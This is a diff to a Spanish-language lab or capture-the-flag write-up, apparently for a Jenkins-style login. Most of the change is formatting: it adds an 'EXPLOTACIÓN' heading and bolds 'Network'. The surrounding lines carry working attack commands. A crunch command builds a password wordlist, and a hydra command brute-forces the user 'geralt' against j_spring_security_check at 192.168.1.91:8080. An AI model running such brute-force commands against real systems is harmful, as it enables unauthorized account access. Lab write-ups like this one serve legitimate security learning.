@@ -66,7 +66,9 @@ crunch 5 5 -t p@@@a -o diccionario.txt
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-Ingresamos el usuario descubierto con una contraseña cualquiera y al inspeccionar la pagina en network cogemos la distinta informacion para realizar el ataque de fuerza bruta.
+### 🚀 **EXPLOTACIÓN**
+
+Ingresamos el usuario descubierto con una contraseña cualquiera y al inspeccionar la pagina en **Network** cogemos la distinta informacion para realizar el ataque de fuerza bruta.
 
 ```bash
 hydra -l geralt -P diccionario.txt 192.168.1.91 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:c=/login:Invalid username or password" -f -V
